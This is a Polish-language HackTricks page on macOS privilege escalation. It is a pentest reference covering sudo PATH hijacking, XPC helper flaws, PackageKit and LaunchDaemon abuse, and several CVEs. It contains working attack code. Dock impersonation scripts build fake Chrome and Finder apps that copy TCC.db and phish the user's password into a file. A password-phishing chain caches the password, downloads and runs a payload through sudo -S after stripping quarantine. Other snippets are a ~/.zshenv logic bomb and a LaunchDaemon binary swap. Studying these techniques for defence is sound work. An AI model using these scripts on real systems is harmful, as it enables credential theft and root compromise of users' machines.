# Eskalacja uprawnień w macOS

{{#include ../../banners/hacktricks-training.md}}

## Eskalacja uprawnień przez TCC

Jeśli szukasz informacji o eskalacji uprawnień przez TCC, przejdź do:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Wiele technik eskalacji uprawnień dotyczących Linuksa lub innych systemów uniksopodobnych ma zastosowanie również w macOS. Zobacz:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Interakcja z użytkownikiem

### Sudo Hijacking

Oryginalną [technikę Sudo Hijacking znajdziesz we wpisie o eskalacji uprawnień w Linuksie](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Jednak macOS **zachowuje** **`PATH`** użytkownika, gdy ten uruchamia **`sudo`**. Oznacza to, że inny sposób przeprowadzenia tego ataku polega na **przejęciu innych plików binarnych**, które ofiara nadal uruchomi podczas **korzystania z sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Zwróć uwagę, że użytkownik korzystający z terminala najprawdopodobniej ma **zainstalowany Homebrew**. Możliwe więc, że uda się przejąć (hijack) pliki binarne w **`/opt/homebrew/bin`**.

### Dock Impersonation

Za pomocą **social engineering** możesz **podszyć się na przykład pod Google Chrome** w Docku i faktycznie uruchomić własny skrypt:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Kilka sugestii:

- Sprawdź, czy w Docku jest Chrome. Jeśli tak, **usuń** ten wpis i **dodaj** **fałszywy** wpis **Chrome w tej samej pozycji** w tablicy Docka.

<details>
<summary>Skrypt podszywający się pod Chrome w Docku</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Kilka sugestii:

- **Nie możesz usunąć Findera z Docka**, więc jeśli chcesz dodać go do Docka, możesz umieścić fałszywy Finder tuż obok prawdziwego. W tym celu musisz **dodać wpis fałszywego Findera na początku tablicy Docka**.
- Inną opcją jest nieumieszczanie go w Docku i po prostu jego otwarcie — „Finder prosi o zezwolenie na sterowanie Finderem” nie jest aż tak dziwne.
- Inną opcją, aby **eskalować uprawnienia do roota bez pytania** o hasło i bez wyświetlania okropnego okna, jest sprawienie, by Finder rzeczywiście poprosił o hasło w celu wykonania uprzywilejowanej czynności:
  - Poproś Findera o skopiowanie nowego pliku **`sudo`** do **`/etc/pam.d`** (w monicie o hasło będzie napisane, że „Finder chce skopiować sudo”).
  - Poproś Findera o skopiowanie nowego **Authorization Plugin** (możesz ustawić nazwę pliku tak, aby w monicie o hasło było napisane, że „Finder chce skopiować Finder.bundle”).

<details>
<summary>Skrypt podszywający się pod Findera w Docku</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Phishing przez monit o hasło + ponowne użycie sudo

Malware często wykorzystuje interakcję użytkownika, aby **przechwycić hasło umożliwiające użycie sudo** i programowo użyć go ponownie. Typowy przebieg:

1. Ustal zalogowanego użytkownika za pomocą `whoami`.
2. **Ponawiaj monity o hasło** do momentu, gdy `dscl . -authonly "$user" "$pw"` zwróci sukces.
3. Zapisz dane uwierzytelniające w pamięci podręcznej (np. `/tmp/.pass`) i wykonuj uprzywilejowane działania za pomocą `sudo -S` (hasło przesyłane przez stdin).

Przykładowy minimalny łańcuch:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Skradzione hasło można następnie wykorzystać ponownie, aby **usunąć kwarantannę Gatekeepera za pomocą `xattr -c`**, kopiować LaunchDaemons lub inne pliki uprzywilejowane i uruchamiać kolejne etapy bez interakcji użytkownika.<sup>[[1]](#references)</sup>

## Nowsze wektory specyficzne dla macOS (2023–2026)

### Nadal można używać przestarzałego `AuthorizationExecuteWithPrivileges`

`AuthorizationExecuteWithPrivileges` zostało uznane za przestarzałe w wersji 10.7, ale **nadal działa w Sonoma/Sequoia**. Wiele komercyjnych programów aktualizujących wywołuje `/usr/libexec/security_authtrampoline` ze ścieżką niezaufanego pliku. Jeśli docelowy plik binarny jest zapisywalny przez użytkownika, możesz podstawić trojana i skorzystać z legalnego monitu:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Połącz z **powyższymi sztuczkami maskowania**, aby wyświetlić wiarygodne okno dialogowe z prośbą o hasło.


### Wstępna analiza uprzywilejowanego helpera / XPC

Wiele współczesnych privesców w macOS od zewnętrznych dostawców przebiega według tego samego schematu: **LaunchDaemon działający jako root** udostępnia **usługę Mach/XPC** z katalogu **`/Library/PrivilegedHelperTools`**, a następnie helper albo **nie weryfikuje klienta**, weryfikuje go **zbyt późno** (race PID) albo udostępnia **metodę działającą jako root**, która używa **ścieżki/skryptu kontrolowanych przez użytkownika**. Ta klasa błędów leży u podstaw wielu niedawnych błędów w helperach klientów VPN, launcherów gier i programów aktualizujących.<sup>[[2]](#references)</sup>

Krótka lista kontrolna wstępnej analizy:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Zwróć szczególną uwagę na helpery, które:

- nadal przyjmują żądania **po odinstalowaniu**, ponieważ zadanie pozostało załadowane w `launchd`
- wykonują skrypty lub odczytują konfigurację z **`/Applications/...`** albo innych ścieżek zapisywalnych przez użytkowników bez uprawnień root
- polegają na walidacji peerów opartej wyłącznie na **PID** lub **bundle-id**, podatnej na wyścigi

Więcej informacji o błędach autoryzacji helperów znajdziesz na [tej stronie](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Dziedziczenie środowiska przez skrypty PackageKit (CVE-2024-27822)

Do czasu naprawienia tego błędu przez Apple w **Sonoma 14.5**, **Ventura 13.6.7** i **Monterey 12.7.5** instalacje inicjowane przez użytkownika za pomocą **`Installer.app`** / **`PackageKit.framework`** mogły uruchamiać **skrypty PKG jako root w środowisku bieżącego użytkownika**. Oznacza to, że pakiet używający **`#!/bin/zsh`** ładowałby **`~/.zshenv`** atakującego i uruchamiał go jako **root**, gdy ofiara zainstalowałaby pakiet.<sup>[[3]](#references)</sup>

Jest to szczególnie interesujące jako **logic bomb**: wystarczy uzyskać foothold na koncie użytkownika i dostęp do zapisywalnego pliku startowego powłoki, a następnie czekać, aż użytkownik uruchomi dowolny podatny instalator oparty na **zsh**. Zasadniczo nie dotyczy to wdrożeń przez **MDM/Munki**, ponieważ są one uruchamiane w środowisku użytkownika root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Jeśli chcesz dokładniej poznać nadużycia związane z instalatorami, sprawdź też [tę stronę](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Kolizja miejsca docelowego instalatora przez `.localized`

Niektóre instalatory firm trzecich rejestrują root LaunchDaemon, którego plik wykonywalny jest wskazywany przez stałą ścieżkę wewnątrz `/Applications/Target.app`. Jeśli atakujący może najpierw utworzyć ten bundle z **innym identyfikatorem bundle**, Instalator może zachować przynętę i umieścić prawdziwą aplikację w `/Applications/Target.localized/Target.app`. Daemon nadal wskazuje pierwotną ścieżkę. W efekcie plik wykonywalny kontrolowany przez atakującego, znajdujący się w przynęcie, może później uruchomić się jako root.<sup>[[8]](#references)</sup>

Ważne warunki wstępne:<sup>[[8]](#references)</sup>

1. Atakujący może utworzyć oczekiwaną ścieżkę aplikacji lub ją kontrolować.
2. Pakiet nie usuwa kolidującego bundle.
3. Uprzywilejowane zadanie używa zakodowanej na stałe ścieżki wewnątrz tego bundle.
4. Użytkownik lub proces MDM instaluje pakiet i rejestruje zadanie.

Poszukaj przeniesionych bundle, a następnie sprawdź cele LaunchDaemon za pomocą pętli enumeracyjnej z następnej sekcji:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Bezpieczniejszy instalator ustala końcową lokalizację bundle i przechowuje uprzywilejowane pliki wykonywalne w lokalizacji należącej do root, takiej jak `/Library/PrivilegedHelperTools`. Powinien też sprawdzić właściciela i podpis kodu przed zarejestrowaniem lub uruchomieniem zadania.<sup>[[8]](#references)</sup>

### Przejęcie zapisywalnego celu LaunchDaemon

Plik plist LaunchDaemon może należeć do root, podczas gdy jego `Program` lub pierwszy wpis `ProgramArguments` wskazuje na katalog, w którym użytkownik może zapisywać pliki. Sprawdź **całą ścieżkę**, a nie tylko uprawnienia pliku wykonywalnego. Jeśli katalog nadrzędny pozwala na zapis, atakujący może zmienić nazwę pliku wykonywalnego należącego do root i utworzyć pod tą samą ścieżką jego zamiennik. Zamiennik zostanie uruchomiony jako root przy następnym starcie zadania. Wystarczy ponowne uruchomienie komputera lub zwykłe ponowne uruchomienie usługi. Atakujący nie musi mieć uprawnień do uruchomienia `launchctl bootstrap` w domenie systemowej.<sup>[[7]](#references)</sup>

Najpierw sprawdź każdy cel i jego bezpośredni katalog nadrzędny:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Gdy plik lub jego katalog nadrzędny jest zapisywalny, zachowaj oryginalny plik binarny i zastąp ścieżkę wykonywalnym payloadem. Następnie poczekaj, aż już załadowany daemon uruchomi się ponownie.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### Wyścig wskaźnika poświadczeń XNU SMR (CVE-2025-24118)

Podatna ścieżka `kauth_cred_proc_update` aktualizowała `proc_ro.p_ucred` za pomocą nieatomowego API `zalloc_ro_mut`, podczas gdy czytniki SMR odczytywały wskaźnik bez blokady. Publiczny trigger wykorzystuje specjalnie przygotowany plik binarny setgid. Jeden wątek przełącza się między rzeczywistym a efektywnym identyfikatorem grupy, podczas gdy drugi wielokrotnie wywołuje syscall, taki jak `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Traktuj to jako **prymityw wyścigu**, a nie gotowy exploit uzyskujący root. Opublikowany PoC demonstruje rozdarty wskaźnik poświadczeń. Zwykle kończy się to kernel panic. Badacz odtworzył uszkodzenie tylko na Intel i nie wykazał deterministycznej kontroli nad wynikowym obiektem poświadczeń. Apple zmieniło aktualizację na atomową wymianę wskaźnika w macOS 15.3.<sup>[[4]](#references)</sup>

### Obejście SIP przez Asystenta migracji („Migraine”, CVE-2023-32369)

Jeśli masz już root, SIP nadal blokuje zapisy w lokalizacjach systemowych. Błąd **Migraine** wykorzystuje entitlement Asystenta migracji `com.apple.rootless.install.heritable`, aby uruchomić proces potomny dziedziczący obejście SIP i nadpisujący chronione ścieżki (np. `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Łańcuch:

1. Uzyskaj root w działającym systemie.
2. Wywołaj `systemmigrationd`, przekazując spreparowany stan, aby uruchomić binarny plik kontrolowany przez atakującego.
3. Użyj dziedziczonego entitlementu, aby zmodyfikować pliki chronione przez SIP; zmiany utrzymają się nawet po ponownym uruchomieniu.

### Przemycanie wyrażeń NSPredicate/XPC (klasa błędów CVE-2023-23530/23531)

Wiele demonów Apple akceptuje obiekty **NSPredicate** przez XPC i sprawdza wyłącznie pole `expressionType`, nad którym kontrolę ma atakujący. Tworząc predicate wykonujący dowolne selektory, można uzyskać **wykonanie kodu w usługach XPC działających jako root/system** (np. `coreduetd`, `contextstored`). W połączeniu z początkowym wyjściem z sandboxa aplikacji pozwala to na **eskalację uprawnień bez monitów użytkownika**. Szukaj endpointów XPC, które deserializują predykaty i nie korzystają z solidnego visitor.<sup>[[6]](#references)</sup>

## TCC - eskalacja uprawnień do root

### CVE-2020-9771 - obejście TCC przez mount_apfs i eskalacja uprawnień

**Każdy użytkownik** (nawet nieuprzywilejowany) może utworzyć i zamontować migawkę Time Machine z opcją `-o noowners` i **uzyskać dostęp do WSZYSTKICH plików** tej migawki, omijając kontrole własności na aktywnym woluminie. Jedynym wymaganym uprawnieniem jest **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) dla używanej aplikacji (np. `Terminal`).

Polecenia i pełne wyjaśnienie znajdują się na stronie poświęconej obejściom TCC:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Informacje wrażliwe

Może to być przydatne do eskalacji uprawnień:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025, rok Infostealera](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: eskalacja uprawnień lokalnych w AWS Client VPN dla macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: eskalacja uprawnień w macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft „Migraine” — obejście SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center — nowa klasa błędów umożliwiających eskalację uprawnień w macOS i iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Przejęcie LaunchDaemon: eskalacja uprawnień i utrwalenie dostępu przez niebezpieczne uprawnienia do folderów](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE w macOS przez katalog .localized](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
